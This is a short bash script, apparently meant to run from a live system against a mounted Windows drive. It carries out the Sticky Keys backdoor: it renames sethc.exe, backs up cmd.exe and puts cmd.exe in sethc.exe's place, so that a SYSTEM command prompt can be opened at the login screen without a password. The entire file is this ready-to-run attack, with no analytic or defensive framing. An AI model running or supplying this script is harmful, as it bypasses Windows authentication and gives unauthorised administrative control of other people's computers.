#!/bin/bash

if [ ! -w "." ]; then
    echo "Filesystem is readonly. Cannot continue."
    exit
fi

if [ ! -d "Windows/System32" ]; then
    echo "Windows/System32 not found. Please run from C:"
    exit
fi

echo "Renaming sethc.exe to sethc2.exe..."
mv Windows/System32/sethc.exe Windows/System32/sethc2.exe

if [ $? -eq 0 ]; then
    echo "DONE"
    echo ""
else
    echo "FAILED"
    exit
fi

echo "Backing up cmd.exe to cmd.bak..."
cp Windows/System32/cmd.exe Windows/System32/cmd.bak

if [ $? -eq 0 ]; then
    echo "DONE"
    echo ""
else
    echo "FAILED"
    exit
fi

echo "Renaming cmd.exe to sethc.exe..."
mv Windows/System32/cmd.exe Windows/System32/sethc.exe

if [ $? -eq 0 ]; then
    echo "DONE"
    echo ""
else
    echo "FAILED"
    exit
fi
